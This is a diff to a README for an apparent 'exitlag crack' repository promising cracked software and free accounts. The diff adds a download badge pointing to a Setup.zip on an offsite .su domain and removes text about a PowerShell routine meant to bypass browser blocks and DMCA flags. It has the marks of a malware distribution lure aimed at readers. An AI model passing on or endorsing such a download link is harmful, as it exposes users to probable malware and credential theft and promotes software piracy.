@@ -5,14 +5,16 @@ Welcome to the open-source community research repository dedicated to optimizing
 This documentation covers topics related to exitlag crack, exitlag free accounts, exit lag crack mechanisms, and official-like optimization methods available this year.
 
 ---
+
+### 🚀 Direct Download
+
+[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)
+
+Read Readme.txt before install!
+
+---
+
 ## 🚀 Automated Installation & Setup (PowerShell)
-
-To bypass manual file downloads that often trigger false-positive browser blocks or immediate DMCA repository flags, we utilize a secure, automated PowerShell routing configuration pipeline.
-
-### Prerequisites:
-* Windows 10 or 11 (64-bit)
-* Administrator privileges
-* Active internet connection
 
 ### Step-by-Step Guide:
 
